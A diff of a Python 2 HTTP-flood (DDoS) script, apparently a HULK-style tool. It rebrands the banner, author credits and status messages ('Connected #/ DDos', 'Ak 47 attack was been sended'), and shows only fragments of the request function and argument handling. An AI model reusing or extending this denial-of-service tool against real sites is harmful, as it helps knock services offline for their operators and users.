@@ -66,14 +66,17 @@ def usage():
 	print "\a"
 print \
 """
-  ___  _   _             _                             
- / _ \| | | |           | |                            
-/ /_\ \ |_| |_ __ _  ___| | _____ _ __     _ __  _   _ 
-|  _  | __| __/ _` |/ __| |/ / _ \ '__|   | '_ \| | | |
-| | | | |_| || (_| | (__|   <  __/ |     _| |_) | |_| |
-\_| |_/\__|\__\__,_|\___|_|\_\___|_|    (_) .__/ \__, |
-                                          | |     __/ |
-                                          |_|    |___/                 BY: @SilvisDDos aka Neptune@Attacker
+
+████████▄  ████████▄   ▄██████▄     ▄████████ 
+███   ▀███ ███   ▀███ ███    ███   ███    ███ 
+███    ███ ███    ███ ███    ███   ███    █▀  
+███    ███ ███    ███ ███    ███   ███        
+███    ███ ███    ███ ███    ███ ▀███████████ 
+███    ███ ███    ███ ███    ███          ███ 
+███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
+████████▀  ████████▀   ▀██████▀   ▄████████▀  
+                                              
+                BY: @suman333mondal aka Online Hacking
 """
 print '---------------------------------------------------'
 
@@ -100,7 +103,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'Connected #/ DDos #/ Neptune@Attacker'
+ 			print 'Connected #/ DDos #/ Oniline-Hacking@DDos-Attacker'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -142,7 +145,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Ak 47 attack was been sended This tool is created by : Russian Hackers"
+		print "Ak 47 attack was been sended This tool is created by : Online Hacking (Russian Hackers)"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
